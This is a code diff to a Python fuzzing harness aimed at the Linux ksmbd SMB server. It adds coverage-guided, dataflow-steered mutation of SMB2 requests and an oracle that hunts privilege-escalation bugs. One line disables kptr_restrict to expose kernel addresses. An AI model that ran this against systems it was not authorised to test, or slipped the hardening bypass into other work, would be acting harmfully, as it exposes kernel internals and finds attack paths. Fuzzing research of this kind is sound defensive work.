+def corpus_bug_id(*chunks) -> str:
+    """BLAKE2b identity for a bug-triggering corpus entry. Hashes the exact
+    bytes that produced the bug (PDU/body/input) so every distinct trigger has
+    a stable, collision-resistant id for dedup and cross-referencing."""
+    h = hashlib.blake2b(digest_size=16)
+    for c in chunks:
+        if c is None:
+            continue
+        if isinstance(c, str):
+            c = c.encode()
+        elif not isinstance(c, (bytes, bytearray)):
+            c = str(c).encode()
+        h.update(bytes(c))
+        h.update(b"\x1e")  # record separator so concatenations don't alias
+    return h.hexdigest()
+
+# Persistent library handle (survives across rounds — accumulates state)
+_persistent_lib = None
+
+# Per-worker coverage identity. Each pool worker dials 127.0.0.<octet> and the
+# kernel routes that connection's kcov-dataflow into the worker's private
+# buffer (see KSMBD_KCOV_DF_IP_HANDLE in fs/smb/server/connection.h). The
+# parent / sequential path keeps octet 1 (127.0.0.1); pool workers get 2,3,...
+_WORKER_OCTET = 1
+
+def _pool_init(counter):
+    """ProcessPoolExecutor initializer: hand each worker a unique octet."""
+    global _WORKER_OCTET, _persistent_lib
+    # Workers ignore Ctrl+C so a single interrupt propagates cleanly to the parent
+    # (default handler) instead of every worker raising its own KeyboardInterrupt
+    # and racing a storm of tracebacks over the corpus save.
+    signal.signal(signal.SIGINT, signal.SIG_IGN)
+    with counter.get_lock():
+        counter.value += 1
+        _WORKER_OCTET = counter.value  # 2, 3, 4, ... (parent stays 1)
+    # With the fork start method a worker inherits the parent's already-built
+    # _persistent_lib (octet 1). Drop it so the next _get_lib() re-initializes
+    # with THIS worker's octet and registers its own private coverage handle.
+    _persistent_lib = None
+
+def _get_lib():
+    """Get or create the persistent libksmbdzzer handle."""
+    global _persistent_lib
+    if _persistent_lib is None:
+        _persistent_lib = ctypes.CDLL(str(SCRIPT_DIR / 'libksmbdzzer.so'))
+        _persistent_lib.pfz_write.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_write.restype = ctypes.c_int
+        _persistent_lib.pfz_truncate.argtypes = [ctypes.c_long]
+        _persistent_lib.pfz_raw_pdu.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_raw_pdu.restype = ctypes.c_int
+        _persistent_lib.pfz_get_features.argtypes = [ctypes.POINTER(ctypes.c_uint32), ctypes.c_int]
+        _persistent_lib.pfz_get_features.restype = ctypes.c_int
+        _persistent_lib.pfz_race_write_close.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_int]
+        _persistent_lib.pfz_compress_fuzz.argtypes = [ctypes.c_uint16, ctypes.c_char_p, ctypes.c_int, ctypes.c_uint32]
+        _persistent_lib.pfz_pool_init_authed.restype = ctypes.c_int
+        _persistent_lib.pfz_pool_oplock_race.argtypes = [ctypes.c_char_p]
+        _persistent_lib.pfz_pool_lock_race.argtypes = [ctypes.c_int]
+        _persistent_lib.pfz_pool_race_authed.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_session_binding_race.restype = ctypes.c_int
+        _persistent_lib.pfz_durable_reconnect.argtypes = [ctypes.c_char_p]
+        _persistent_lib.pfz_ndr_fuzz.argtypes = [ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_query_dir.argtypes = [ctypes.c_uint8, ctypes.c_uint32, ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_setxattr.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_copychunk.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_uint32, ctypes.c_int]
+        _persistent_lib.pfz_compound.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_raw_pdu_authed.argtypes = [ctypes.c_uint16, ctypes.c_char_p, ctypes.c_int, ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_pool_init.argtypes = [ctypes.c_int]
+        _persistent_lib.pfz_set_failslab.argtypes = [ctypes.c_int]
+        _persistent_lib.pfz_negotiate_contexts.argtypes = [ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_unknown_pipe.argtypes = [ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_unicode_path.argtypes = [ctypes.c_char_p, ctypes.c_int]
+        # Grain registry (new phase architecture): enumerate + run normal-scenario grains
+        _persistent_lib.pfz_grain_count.restype = ctypes.c_int
+        _persistent_lib.pfz_grain_name.argtypes = [ctypes.c_int]
+        _persistent_lib.pfz_grain_name.restype = ctypes.c_char_p
+        _persistent_lib.pfz_grain_run.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_grain_run.restype = ctypes.c_int
+        _persistent_lib.pfz_grain_combo2.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_grain_combo2.restype = ctypes.c_int
+        # Dataflow records + authenticated probe (I2S mutator + contract oracle)
+        _persistent_lib.pfz_get_records.argtypes = [ctypes.POINTER(DataflowRec), ctypes.c_int]
+        _persistent_lib.pfz_get_records.restype = ctypes.c_int
+        _persistent_lib.pfz_get_pc_ret_pairs.argtypes = [ctypes.POINTER(ctypes.c_uint64), ctypes.c_int]
+        _persistent_lib.pfz_get_pc_ret_pairs.restype = ctypes.c_int
+        _persistent_lib.pfz_probe_init_share.argtypes = [ctypes.c_char_p]
+        _persistent_lib.pfz_probe_send.argtypes = [ctypes.c_uint16, ctypes.c_char_p, ctypes.c_int, ctypes.c_char_p, ctypes.c_int]
+        _persistent_lib.pfz_probe_send.restype = ctypes.c_int
+        _persistent_lib.pfz_probe_reconnect.argtypes = [ctypes.c_char_p]
+        _persistent_lib.pfz_probe_reconnect.restype = ctypes.c_int
+        _persistent_lib.pfz_probe_send_frag.argtypes = [ctypes.c_uint16, ctypes.c_char_p, ctypes.c_int, ctypes.c_char_p, ctypes.c_int, ctypes.c_int]
+        _persistent_lib.pfz_probe_send_frag.restype = ctypes.c_int
+        _persistent_lib.pfz_probe_get_fid.argtypes = [ctypes.c_char_p]
+        if _persistent_lib.pfz_init(_WORKER_OCTET) < 0:
+            print(f"  [!] libksmbdzzer init failed (octet {_WORKER_OCTET}), reconnecting...", flush=True)
+            _persistent_lib.pfz_reconnect()
+        _persistent_lib._initialized = True
+    return _persistent_lib
+
+
+# ─── Target-function resolver (PC → ksmbd function via /proc/kallsyms) ─────────
+class TargetMap:
+    """Resolve [start,end) address ranges for the ksmbd write/parse call graph so
+    dataflow records can be attributed to a specific function. Degrades to an
+    empty map (oracle still works from input+status) if kallsyms is restricted.
+
+    Upgrade 2: the allowlist was 5 symbols, so all but two functions' dataflow
+    records were anonymous value-counters. Widen it to the write-side + request-
+    parse graph — CREATE/WRITE/READ/SET_INFO/IOCTL/rename/xattr/lock/lease/oplock/
+    copychunk — so i2s_correspondence() can label (and the oracle can key on) far
+    more of the arguments the kernel actually reports.
+    Upgrade 4: make resolution robust — drop kptr_restrict if it hides addresses,
+    and count how many targets actually resolved so 'anonymous' is visible, not
+    silent."""
+    TARGETS = (
+        # CREATE / open gate
+        "smb2_open", "smb2_create", "smb2_create_open_flags", "smb2_creat",
+        # WRITE / READ
+        "smb2_write", "ksmbd_vfs_write", "smb2_read", "ksmbd_vfs_read",
+        # truncate / set-info (size, disposition, rename via SET_INFO)
+        "ksmbd_vfs_truncate", "smb2_set_info_file", "set_file_allocation_info",
+        "set_end_of_file_info", "set_rename_info", "set_file_disposition_info",
+        # delete / rename / link / mkdir
+        "ksmbd_vfs_remove_file", "ksmbd_vfs_unlink", "ksmbd_vfs_rename",
+        "ksmbd_vfs_link", "ksmbd_vfs_mkdir", "ksmbd_vfs_fp_rename",
+        # xattr / streams / ACL
+        "ksmbd_vfs_setxattr", "ksmbd_vfs_getxattr", "ksmbd_vfs_remove_xattr",
+        "ksmbd_vfs_set_dos_attrib_xattr", "smb2_set_ea",
+        # lock / lease / oplock
+        "smb2_lock", "smb2_lease_break", "smb_grant_oplock", "find_same_lease_key",
+        "smb2_oplock_break", "ksmbd_vfs_lock",
+        # ioctl / copychunk / fsctl
+        "smb2_ioctl", "fsctl_copychunk", "ksmbd_vfs_copy_file_ranges",
+        # query
+        "smb2_query_dir", "smb2_query_info", "ksmbd_vfs_getattr",
+        # request-parse / bounds gate (where length/offset bugs are validated)
+        "ksmbd_smb2_check_message", "smb2_get_data_area_len",
+        "smb2_calc_size", "ksmbd_smb_request",
+    )
+
     def __init__(self):
-        self.fd = os.open('/sys/kernel/debug/kcov_dataflow', os.O_RDWR)
-        assert libc.ioctl(self.fd, KCOV_DF_INIT, ctypes.c_ulong(BUF_WORDS)) == 0
-        ptr = libc.mmap(None, BUF_WORDS * 8, 0x3, 0x01, self.fd, 0)
-        assert ptr != ctypes.c_void_p(-1).value
-        self.buf = (ctypes.c_uint64 * BUF_WORDS).from_address(ptr)
+        self.ranges = {}
+        self.resolved = 0
+        self._load()
+        # Upgrade 4: if kallsyms handed us all-zero / no addresses, kptr_restrict is
+        # likely on. Try to drop it (root in the guest) and re-read once.
+        if not self.ranges:
+            try:
+                with open("/proc/sys/kernel/kptr_restrict", "w") as f:
+                    f.write("0\n")
+                self._load()
+            except OSError:
+                pass
 
-    def enable(self):
-        self.buf[0] = 0
-        libc.ioctl(self.fd, KCOV_DF_REMOTE_ENABLE, 0)
+    def _load(self):
+        try:
+            syms = []
+            with open("/proc/kallsyms") as f:
+                for line in f:
+                    p = line.split()
+                    if len(p) >= 3 and p[1] in "tT":
+                        a = int(p[0], 16)
+                        if a:
+                            syms.append((a, p[2]))
+            syms.sort()
+            want = set(self.TARGETS)
+            ranges = {}
+            for i, (a, n) in enumerate(syms):
+                if n in want and n not in ranges:
+                    end = syms[i + 1][0] if i + 1 < len(syms) else a + 0x2000
+                    ranges[n] = (a, end)
+            self.ranges = ranges
+            self.resolved = len(ranges)
+        except Exception:
+            self.ranges = {}
+            self.resolved = 0
 
-    def disable(self):
-        libc.ioctl(self.fd, KCOV_DF_REMOTE_DISABLE, 0)
-
-    def features_fast(self):
-        h = _load_harness()
-        if h:
-            if not hasattr(h, '_ps'):
-                h.harness_parse_df.restype = ctypes.c_int
-                h.harness_parse_df.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.POINTER(ctypes.c_uint), ctypes.c_int]
-                h._ps = True
-            out = (ctypes.c_uint * 4096)()
-            n = h.harness_parse_df(ctypes.addressof(self.buf), BUF_WORDS, out, 4096)
-            return set(out[i] for i in range(min(n, 4096)))
-        return self._features_py()
-
-    def _features_py(self):
-        s, r = self.read()
-        feat = set()
-        for v in s:
-            feat.add(((0xcbf29ce484222325 ^ v) * 0x100000001b3) & 0xFFFFFFFF)
-        for pc, v in r:
-            h = ((0xcbf29ce484222325 ^ pc) * 0x100000001b3) & 0xFFFFFFFFFFFFFFFF
-            feat.add(((h ^ v) * 0x100000001b3) & 0xFFFFFFFF)
-        return feat
-
-    def read(self):
-        scalars, returns = [], []
-        n = min(int(self.buf[0]), BUF_WORDS - 1)
-        pos = 1
-        while pos + 3 <= 1 + n:
-            header, pc = self.buf[pos], self.buf[pos + 1]
-            rtype = (header >> 28) & 0xF
-            nfields = (header >> 24) & 0xF or 1
-            rlen = 3 + nfields
-            if pos + rlen > 1 + n: break
-            if 0xffffffff80000000 <= pc <= 0xffffffffffffff00:
-                if rtype == 0xF: returns.append((pc, self.buf[pos + 3]))
-                elif rtype == 0xE:
-                    for i in range(min(nfields, 4)):
-                        v = self.buf[pos + 3 + i]
-                        if v < 0x100000000: scalars.append(int(v))
-            pos += rlen
-        return scalars, returns
-
-    def count_success_returns(self):
-        """Count functions that returned 0 (success = bypassed validation, deeper path).
-        Returns (success_count, total_returns, new_error_codes)."""
-        n = min(int(self.buf[0]), BUF_WORDS - 1)
-        pos = 1
-        success = 0
-        total = 0
-        errors = set()
-        while pos + 3 <= 1 + n:
-            header, pc = self.buf[pos], self.buf[pos + 1]
-            rtype = (header >> 28) & 0xF
-            nfields = (header >> 24) & 0xF or 1
-            rlen = 3 + nfields
-            if pos + rlen > 1 + n: break
-            if 0xffffffff80000000 <= pc <= 0xffffffffffffff00 and rtype == 0xF:
-                ret_val = self.buf[pos + 3]
-                total += 1
-                if ret_val == 0:
-                    success += 1
-                elif ret_val < 0x1000:  # small positive/negative = error code
-                    errors.add(int(ret_val))
-                elif ret_val > 0xFFFFFFFFFFFFFF00:  # negative errno (two's complement)
-                    errors.add(int(ret_val) - 0x10000000000000000)
-            pos += rlen
-        return success, total, errors
-
-# ─── C Extension ──────────────────────────────────────────────────────────────
-
-_harness = None
-def _load_harness():
-    global _harness
-    if _harness is None:
-        so = SCRIPT_DIR / 'sniper' / 'harness.so'
-        if so.exists():
-            _harness = ctypes.CDLL(str(so))
-            _harness.harness_pwrite.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.c_int]
-            _harness.harness_truncate.argtypes = [ctypes.c_long]
-            _harness.harness_xattr.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_int]
-            _harness.harness_fallocate.argtypes = [ctypes.c_long, ctypes.c_long]
-    return _harness
-
-def do_write(fp, off, data):
-    h = _load_harness()
-    if h: h.harness_pwrite(off, data, len(data))
-    else:
-        fd = os.open(fp, os.O_WRONLY|os.O_CREAT, 0o666); os.lseek(fd, off, 0); os.write(fd, data); os.close(fd)
-
-def do_truncate(fp, sz):
-    h = _load_harness()
-    if h: h.harness_truncate(sz & 0x7FFFFFFF)
-    else:
-        try: os.truncate(fp, sz & 0x7FFFFFFF)
-        except OSError: pass
-
-def do_xattr(fp, name, val):
-    h = _load_harness()
-    if h: h.harness_xattr(name.encode(), val, len(val))
-    else:
-        try: os.setxattr(fp, name, val)
-        except OSError: pass
-
-def do_lock(fp):
-    import fcntl
-    try:
-        fd = os.open(fp, os.O_RDWR); fcntl.flock(fd, fcntl.LOCK_EX|fcntl.LOCK_NB); fcntl.flock(fd, fcntl.LOCK_UN); os.close(fd)
-    except OSError: pass
-
-def do_read(fp, off, size):
-    try:
-        fd = os.open(fp, os.O_RDONLY); os.lseek(fd, off, 0); os.read(fd, size); os.close(fd)
-    except OSError: pass
-
-def do_rename(fp, worker_id):
-    dst = f'{MOUNT}/fuzz_rename_{worker_id}'
-    try: os.rename(fp, dst); os.rename(dst, fp)
-    except OSError: pass
-
-def do_unlink_create(fp):
-    """unlink + recreate (exercises FILE_DISPOSITION + CREATE)."""
-    try: os.unlink(fp); Path(fp).write_bytes(b'x')
-    except OSError: pass
-
-def do_symlink(fp, worker_id):
-    link = f'{MOUNT}/fuzz_link_{worker_id}'
-    try: os.unlink(link)
-    except OSError: pass
-    try: os.symlink(fp, link)
-    except OSError: pass
-
-def do_readdir():
-    try: os.listdir(MOUNT)
-    except OSError: pass
-
-def do_copy_range(fp, worker_id):
-    dst = f'{MOUNT}/fuzz_dst_{worker_id}'
-    try:
-        sfd = os.open(fp, os.O_RDONLY)
-        dfd = os.open(dst, os.O_WRONLY|os.O_CREAT, 0o666)
-        os.copy_file_range(sfd, dfd, 4096)
-        os.close(sfd); os.close(dfd)
-    except (OSError, AttributeError): pass
-
-# ─── VFS Operations Strategy Map ──────────────────────────────────────────────
-
-VFS_OPS: dict[str, Callable] = {
-    'write': do_write,
-    'truncate': do_truncate,
-    'xattr': do_xattr,
-    'lock': do_lock,
-    'read': do_read,
-    'rename': do_rename,
-    'unlink': do_unlink_create,
-    'symlink': do_symlink,
-    'readdir': do_readdir,
-    'copy_range': do_copy_range,
-}
-
-# ─── Raw PDU helpers ──────────────────────────────────────────────────────────
-
-def _smb2_hdr(cmd, mid, tid=0, sid=0):
-    h = bytearray(64)
-    h[0:4] = b'\xfeSMB'
-    struct.pack_into('<H', h, 4, 64)
-    struct.pack_into('<H', h, 6, 1)
-    struct.pack_into('<H', h, 12, cmd)
-    struct.pack_into('<H', h, 14, 1)
-    struct.pack_into('<Q', h, 24, mid)
-    struct.pack_into('<I', h, 36, tid)
-    struct.pack_into('<Q', h, 40, sid)
-    return bytes(h)
-
-def _raw_send(sock, pdu):
-    try:
-        sock.sendall(struct.pack('>I', len(pdu)) + pdu)
-        sock.settimeout(2)
-        hdr = b''
-        while len(hdr) < 4:
-            c = sock.recv(4 - len(hdr))
-            if not c: return None
-            hdr += c
-        rlen = struct.unpack('>I', hdr)[0]
-        if rlen > 1048576: return b'ERR'
-        resp = b''
-        while len(resp) < rlen:
-            c = sock.recv(min(rlen - len(resp), 65536))
-            if not c: break
-            resp += c
-        return resp
-    except (socket.timeout, ConnectionError, BrokenPipeError, OSError):
+    def whatis(self, pc):
+        for name, (s, e) in self.ranges.items():
+            if s <= pc < e:
+                return name
         return None
 
-# ─── Worker Cycle ─────────────────────────────────────────────────────────────
 
-@dataclass
-class FuzzWorker:
-    """Single fuzzing worker cycle.
-    
-    Encapsulates worker state and delegates to phase implementations.
-    Use: result = FuzzWorker.execute(worker_id, vpool, corpus, features)
+# ─── Data-flow-guided I2S steering primitives (RedQueen + GREYONE + AFLGo-lite) ─
+# The methodology, stated in CS terms: use the kcov-dataflow VALUE observation as
+# the input-to-state channel (RedQueen), drive controlled fields to edges, and reward
+# inputs by symbol-address distance to a target (directed greybox, AFLGo-lite). No
+# disassembly reasoning, no SMT, no LLM — the kernel tells us the value, we just find
+# it in the input and steer it.
+
+# Boundary/target values per width — where length/offset/flag bugs live.
+_I2S_BOUNDARIES = {
+    2: (0x0000, 0x0001, 0x7fff, 0x8000, 0xffff),
+    4: (0x00000000, 0x00000001, 0x7fffffff, 0x80000000, 0xffffffff),
+    8: (0, 1, 0x7fffffffffffffff, 0x8000000000000000, 0xffffffffffffffff),
+}
+
+
+def i2s_correspondence(body, recs, tmap=None):
+    """RedQueen input-to-state map. For each observed kernel ENTRY-arg value, locate
+    its little-endian encoding in `body`. Returns {offset: (value, width, func,
+    arg_idx)} — literal proof that input bytes [offset:offset+width] control a kernel
+    argument. This is the core of the data-flow-guided I2S methodology: the kernel
+    reported the value via kcov-dataflow; we just find it in the input (no SMT, no
+    disassembly). Works because SMB2 fields (access/disposition/options/offset/length)
+    are DIRECT, untransformed — exactly the input-to-state correspondence hypothesis."""
+    corr = {}
+    for r in recs:
+        if r.type != 0xE:                     # entry args only
+            continue
+        func = tmap.whatis(r.pc) if tmap else None
+        for i in range(min(r.nfields, 6)):
+            v = int(r.vals[i])
+            if v == 0 or v >= (1 << 64):
+                continue
+            for width in (8, 4, 2):
+                if v >> (width * 8):
+                    continue
+                off = body.find(v.to_bytes(width, "little"))
+                if off >= 0:
+                    corr[off] = (v, width, func, int(r.arg_idx))
+                    break
+    return corr
+
+
+# ─── I2S directed mutator + access-control contract oracle ────────────────────
+_emitted_findings = set()   # dedup reproducers across cycles/workers
+
+class DataflowDirector:
+    """Always-on write-side LPE hunt:
+      1. I2S mutator — builds CREATE/WRITE bodies whose le-encoded fields land
+         as smb2_create_open_flags()/ksmbd_vfs_write() arguments, steering them
+         to the dangerous access/disposition/option combinations.
+      2. Contract oracle — over the dataflow record stream, flags a privileged
+         create/truncate/delete reached with insufficient granted access and
+         emits a record-level reproducer (input bytes + observed args + status).
+
+    ARBITER (DONE): _distill() closes the cross-round data-driven loop — from this
+    director's trace-args/ret records + oracle interest it computes {hot offsets,
+    interesting values}, packs them (write_feedback) to FUZZDB/fb.bin, and the C
+    mutate_i2s() reads them at init. Behavior changes via DATA (corpus + g_fb + live
+    df_buf), C frozen (compile once). Only fires when the director authenticates —
+    so it is currently gated behind the open AUTH bug.
+    TODO(next-step): keep a fraction of the fleet on plain havoc as a CONTROL so a
+    bad g_fb can't blind the whole fleet and directed-vs-havoc stays comparable.
     """
-    worker_id: int
-    vpool: list
-    seed_corpus: list
-    seed_features: list
+    _tmap = None
 
-    @staticmethod
-    def execute(args: tuple) -> tuple:
-        """Entry point for multiprocessing.Pool.map — wraps with error handling."""
+    def __init__(self, lib, worker_octet=1):
+        self.lib = lib
+        self.octet = worker_octet
+        if DataflowDirector._tmap is None:
+            DataflowDirector._tmap = TargetMap()
+        self.tmap = DataflowDirector._tmap
+        self._recbuf = (DataflowRec * 4096)()
+        self._resp = ctypes.create_string_buffer(8192)
+        self._retbuf = (ctypes.c_uint64 * 4096)()   # RedQueen return harvest (upgrade 3)
+        self._ret_acc = set()
+        self.ready = False
+
+    # ---- transport helpers ----------------------------------------------------
+    def _probe(self, cmd, body):
+        r = self.lib.pfz_probe_send(cmd, body, len(body), self._resp, 8192)
+        if r < 12:
+            return None, -1
+        # Harvest this request's kernel RETURN values BEFORE the next send resets
+        # the dataflow buffer (upgrade 3 — RedQueen returned-value → future token).
+        self._accumulate_returns()
+        status = int.from_bytes(self._resp.raw[8:12], "little")
+        return self._resp.raw[:r], status
+
+    def _accumulate_returns(self):
+        """Pull the (pc, ret_value) pairs the kernel just produced (0xF records) and
+        keep the plausibly-useful magic constants. A size/handle/error the kernel
+        COMPUTED and returned is exactly what a downstream comparison will check the
+        NEXT input against — so feeding it back as a dictionary token lets the mutator
+        satisfy that check without brute force. Skips 0/1 (trivial) and kernel
+        pointers (0xffff… — not splice-able into a wire field)."""
         try:
-            return _run_one_cycle_impl(args)
+            got = self.lib.pfz_get_pc_ret_pairs(self._retbuf, 2048)
         except Exception:
-            import traceback
-            traceback.print_exc()
-            return (0, 0, 0, 0, [], [], [])
-
-
-def run_one_cycle(args):
-    """Single worker cycle (backward-compatible entry point)."""
-    return FuzzWorker.execute(args)
-
-def _remount_cifs():
-    """Remount CIFS share after ksmbd crash/recovery."""
-    return _service.restart_and_remount()
-
-
-def _run_one_cycle_impl(args):
-    """Single worker cycle. args = (worker_id, shared_value_pool_proxy, seed_corpus, seed_features)"""
-    worker_id, vpool_proxy, seed_corpus, seed_features = args
-    fpath = f'{MOUNT}/fuzz_{worker_id}'
-    try:
-        Path(fpath).write_bytes(b'x')
-    except OSError:
-        # CIFS mount dead — try to recover
-        try:
-            _remount_cifs()
-            Path(fpath).write_bytes(b'x')
-        except:
-            return (0, 0, 0, 0, [], [], [])  # skip this cycle
-    df = DfRemote()
-    h = _load_harness()
-    if h: h.harness_open(fpath.encode())
-
-    # Phase 0: calibration
-    noisy_pcs = set()
-    ret_sets = []
-    for _ in range(3):
-        df.enable(); do_write(fpath, 0, b'STABLE'); df.disable()
-        _, rets = df.read()
-        ret_sets.append(set((pc, v) for pc, v in rets))
-    if ret_sets:
-        stable = ret_sets[0] & ret_sets[1] & ret_sets[2]
-        noisy_pcs = {pc for pc, v in ((ret_sets[0]|ret_sets[1]|ret_sets[2]) - stable)}
-
-    # Seed from persistent corpus + shared pool
-    all_features = set(seed_features)
-    corpus = [(off, data, rank) for off, data, rank in seed_corpus]
-    value_pool = list(vpool_proxy) if vpool_proxy else [0, 64, 4096, 0x1000, 0xFFFF]
-
-    # Phase 1: discovery (5000 iters)
-    new_values = []
-    for _ in range(5000):
-        if corpus and random.random() < 0.7:
-            c = random.choices(corpus, weights=[r for _, _, r in corpus])[0]
-            offset = c[0] ^ (1 << random.randint(0, 20))
-            data = bytearray(c[1])
-            if data: data[random.randint(0, len(data)-1)] ^= random.randint(1, 255)
-            data = bytes(data)
-        else:
-            offset = random.choice(value_pool) if value_pool else random.randint(0, 0xFFFF)
-            data = os.urandom(random.choice([1, 64, 4096, 4095, 8192]))
-
-        df.enable()
-        op = random.choice(['write','write','truncate','xattr','lock',
-                           'read','rename','unlink','symlink','readdir','copy_range'])
-        if op == 'write': do_write(fpath, offset & 0xFFFFFF, data)
-        elif op == 'truncate': do_truncate(fpath, offset)
-        elif op == 'xattr': do_xattr(fpath, f'user.f{random.randint(0,99)}', data[:256])
-        elif op == 'lock': do_lock(fpath)
-        elif op == 'read': do_read(fpath, offset & 0xFFFFFF, len(data))
-        elif op == 'rename': do_rename(fpath, worker_id)
-        elif op == 'unlink': do_unlink_create(fpath)
-        elif op == 'symlink': do_symlink(fpath, worker_id)
-        elif op == 'readdir': do_readdir()
-        elif op == 'copy_range': do_copy_range(fpath, worker_id)
-        else: do_lock(fpath)
-        df.disable()
-
-        features = df.features_fast()
-        # Return-value-aware: count how many functions returned 0 (success = deeper path)
-        success_cnt, total_ret, err_codes = df.count_success_returns()
-        # Also collect raw scalars for value_pool
-        scalars, _ = df.read()
-        for v in scalars:
-            if 0 < v < 0x100000000:
-                new_values.append(v)
-
-        # Sharp: anomaly detection (ret=0 for arg > 2× prev max)
-        try:
-            # sharp merged below
-            entries = [(pc, val) for pc, val in zip(scalars[::2], scalars[1::2]) if pc > 0xffffffff80000000]
-            returns = [(pc, val) for pc, val in zip(scalars[::2], scalars[1::2]) if val == 0]
-            check_anomaly(entries, returns)
-        except: pass
-
-        new = features - all_features
-        if new:
-            all_features.update(new)
-            # Rank: new features + bonus for success returns (bypassed validation)
-            rank = len(new) + (success_cnt * 2)
-            corpus.append((offset, data, rank))
-            # Sharp: record sequence that reached new coverage
-            try:
-                # sharp merged below
-                record_operation([(op, offset)], list(features)[:20])
-            except: pass
-
-    # Feed new values back to shared pool
-    corpus.sort(key=lambda x: x[2], reverse=True)
-    corpus.sort(key=lambda x: x[2], reverse=True)
-    corpus = corpus[:512]
-
-    # Phase 2: adaptive sniper (boundaries from transitions)
-    boundaries = [0, 1, 0xFF, 0x1000, 0x7FFF, 0x8000, 0xFFFF, 0x7FFFFFFF, 0xFFFFFFFF]
-    # Add adaptive boundaries from value_pool
-    for v in value_pool[:20]:
-        if 0 < v < 0x1000000:
-            boundaries.extend([v-1, v, v+1])
-    boundaries = list(set(boundaries))
-
-    transitions = 0
-    total = 0
-    transition_values = []  # track which values caused transitions
-
-    for idx in range(min(len(corpus), 50)):
-        base_off, base_data, _ = corpus[idx]
-        df.enable(); do_write(fpath, base_off & 0xFFFFFF, base_data); df.disable()
-        _, base_rets = df.read()
-        base_sig = {(pc, v) for pc, v in base_rets}
-
-        for bval in boundaries[:25]:
-            df.enable(); do_write(fpath, bval & 0xFFFFFF, base_data); df.disable()
-            _, new_rets = df.read()
-            new_sig = {(pc, v) for pc, v in new_rets}
-            total += 1
-            diff = {(pc, v) for pc, v in new_sig.symmetric_difference(base_sig) if pc not in noisy_pcs}
-            if diff:
-                transitions += 1
-                transition_values.append(bval)
-
-        # Race
-        import threading
-        t1 = threading.Thread(target=do_write, args=(fpath, base_off & 0xFFFFFF, os.urandom(4096)))
-        t2 = threading.Thread(target=do_truncate, args=(fpath, base_off & 0xFFFF))
-        df.enable(); t1.start(); t2.start(); t1.join(); t2.join(); df.disable()
-        total += 1
-
-    # Phase 3: raw PDU — dynamic mutations from value_pool + coverage-guided
-    raw_transitions = 0
-    try:
-        from smbprotocol.connection import Connection, Dialects
-        from smbprotocol.session import Session
-        from smbprotocol.tree import TreeConnect
-        from smbprotocol.open import Open, CreateDisposition, ShareAccess, CreateOptions
-        import uuid
-
-        conn = Connection(uuid.uuid4(), "127.0.0.1", 445)
-        conn.connect(dialect=Dialects.SMB_3_1_1)
-        sess = Session(conn, "fuzz", "fuzz", require_encryption=True)
-        sess.connect()
-        tree = TreeConnect(sess, "\\\\127.0.0.1\\share")
-        tree.connect()
-        f = Open(tree, f"fuzz_raw_{worker_id}")
-        f.create(0, 0x12019F, 0x80,
-                 ShareAccess.FILE_SHARE_READ|ShareAccess.FILE_SHARE_WRITE|ShareAccess.FILE_SHARE_DELETE,
-                 CreateDisposition.FILE_OPEN_IF, CreateOptions.FILE_NON_DIRECTORY_FILE)
-        file_id = f.file_id
-        sid, tid = sess.session_id, tree.tree_connect_id
-        mid = conn.sequence_window['low'] + 100
-        sock = conn.transport._sock
-        conn.transport._sock = None
-        conn.transport.connected = False
-
-        # Coverage-guided: track hits per PDU type, send more of winners
-        pdu_hits = {'ioctl': 0, 'querydir': 0, 'lock': 0, 'read': 0, 'write': 0, 'close': 0}
-
-        def raw_pdu(cmd, body, ptype='ioctl'):
-            nonlocal mid, raw_transitions
-            hdr = _smb2_hdr(cmd, mid, tid, sid); mid += 1
-            df.enable(); _raw_send(sock, hdr + body); df.disable()
-            if df.features_fast():
-                raw_transitions += 1
-                pdu_hits[ptype] += 1
-
-        # Pick values from pool for dynamic mutations
-        pool_vals = list(value_pool[-200:]) if value_pool else [0, 0xFFFF, 0x7FFFFFFF]
-        tv = transition_values if transition_values else [0, 0x1000, 0xFFFFFFFF]
-
-        # Dynamic IOCTL mutations
-        for _ in range(8):
-            v1 = random.choice(pool_vals + tv)
-            v2 = random.choice(pool_vals + tv)
-            ctl = random.choice([0x000980C8, 0x000940CF, 0x001480044, 0x00098344, 0x00140204])
-            if ctl in (0x000980C8, 0x000940CF):
-                payload = struct.pack('<qq', v1, v2)
-            elif ctl == 0x001480044:
-                payload = b'\x00'*24 + struct.pack('<II', v1 & 0xFFFFFFFF, 0) + struct.pack('<qqII', v2, v2, v1 & 0xFFFFFFFF, 0)
-            else:
-                payload = os.urandom(min(abs(v1 & 0xFF) + 16, 128))
-            body = struct.pack('<HHI', 57, 0, ctl) + file_id
-            body += struct.pack('<IIIIIII', 120, len(payload), 0, 0, 0, 4096, 1) + struct.pack('<I', 0) + payload
-            raw_pdu(0x000B, body, 'ioctl')
-
-        # Dynamic QUERY_DIR
-        for _ in range(6):
-            cls = random.choice([0, 1, 2, 3, 12, 37, 38, 60, 99, 128, 255])
-            obl = random.choice(pool_vals + [0, 0xFFFF, 0xFFFFFFFF]) & 0xFFFFFFFF
-            pat = random.choice([b'*\x00', b'?\x00', os.urandom(random.randint(2,64)), b'\xff'*32])
-            body = struct.pack('<HBBI', 33, cls, random.randint(0,0xFF), 0) + file_id
-            body += struct.pack('<HHI', 96, len(pat), obl) + pat
-            raw_pdu(0x000E, body, 'querydir')
-
